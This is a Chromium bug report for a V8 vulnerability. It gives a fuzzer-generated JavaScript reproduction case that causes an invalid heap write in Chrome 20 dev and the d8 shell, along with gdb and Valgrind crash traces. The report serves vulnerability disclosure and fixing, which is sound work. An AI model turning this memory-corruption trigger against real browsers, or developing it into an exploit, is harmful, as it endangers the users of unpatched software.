<b>VULNERABILITY DETAILS</b>
The JavaScript code below crashes Chromium 20.0.1115.1 dev and d8 shell (trunk rev 11428) on the heap with an invalid write to a random/weird address (see traces below for address information).


<b>VERSION</b>
Chrome Version: 20.0.1115.1 dev
Operating System: Ubuntu 11.10 64 bit


<b>REPRODUCTION CASE</b>
(function () {
  function PrettyPrint(value) {
     var string = Object.prototype.toString.call(value);
     return "(" + PrettyPrint(value.valueOf()) + ")";
  }
  function deepEquals(a, b) {
      return (1 / a) === (1 / b);
  };
  assertEquals = function assertEquals(expected, found, name_opt) {
    if (!deepEquals(found, expected)) {
      fail(PrettyPrint(expected), found, name_opt);
    }
  };
})();
try {
function Hash() {}
Hash.prototype.m = function() {};
var h = new Hash();
  assertEquals(i < 50 || i >= 70 ? 1 : 2, h.m());
} catch(exc1) {}
function test(a) {
  a[0] = (1.5);
  assertEquals(0, a.length = 0);
}
var a = new Array();
var n = 100000000;
var result = 0;
for (var i = 0; i < n; ++i) {
  result += test(a);
}


<b>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION</b>
Type of crash: tab
Crash State:

Program received signal SIGSEGV, Segmentation fault.
0x00002a96d1438218 in ?? ()
(gdb) bt 4
#0  0x00002a96d1438218 in ?? ()
#1  0x00002a96d1438ecd in ?? ()
#2  0x0000085bdd96c1f9 in ?? ()
#3  0x00001ef623406c11 in ?? ()
(More stack frames follow...)
(gdb) x /i $pc
=> 0x2a96d1438218:      movsd  %xmm0,0xf(%rdi,%rcx,8)
(gdb) info reg xmm0 rdi rcx
xmm0           {v4_float = {0x0, 0x1, 0x0, 0x0}, v2_double = {0x1, 0x0}, 
  v16_int8 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x3f, 0x0, 0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0}, v8_int16 = {0x0, 0x0, 0x0, 0x3ff8, 0x0, 0x0, 0x0, 
    0x0}, v4_int32 = {0x0, 0x3ff80000, 0x0, 0x0}, v2_int64 = {
    0x3ff8000000000000, 0x0}, uint128 = 0x00000000000000003ff8000000000000}
rdi            0x39634615fff0   63098540392432
rcx            0x0      0


Trace from D8 with Valgrind:

==31504== Invalid write of size 8
==31504==    at 0x178C1F040D18: ???
==31504==    by 0x178C1F03D6C5: ???
==31504==    by 0x178C1F00C8A6: ???
==31504==    by 0x178C1F006115: ???
==31504==    by 0x469EBF: v8::internal::Invoke(bool, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, bool*) (in /scratch/holler/LangFuzz/v8-trunk/d8)
==31504==    by 0x46B71D: v8::internal::Execution::Call(v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, bool*, bool) (in /scratch/holler/LangFuzz/v8-trunk/d8)
==31504==    by 0x40DE08: v8::Script::Run() (in /scratch/holler/LangFuzz/v8-trunk/d8)
==31504==    by 0x6A82B1: v8::Shell::ExecuteString(v8::Handle<v8::String>, v8::Handle<v8::Value>, bool, bool) (in /scratch/holler/LangFuzz/v8-trunk/d8)
==31504==    by 0x6A9C84: v8::SourceGroup::Execute() (in /scratch/holler/LangFuzz/v8-trunk/d8)
==31504==    by 0x6AA6BF: v8::Shell::RunMain(int, char**) (in /scratch/holler/LangFuzz/v8-trunk/d8)
==31504==    by 0x6AAA6C: v8::Shell::Main(int, char**) (in /scratch/holler/LangFuzz/v8-trunk/d8)
==31504==    by 0x580BEEC: (below main) (in /lib64/libc-2.12.2.so)
==31504==  Address 0x1101aa19ffff is not stack'd, malloc'd or (recently) free'd

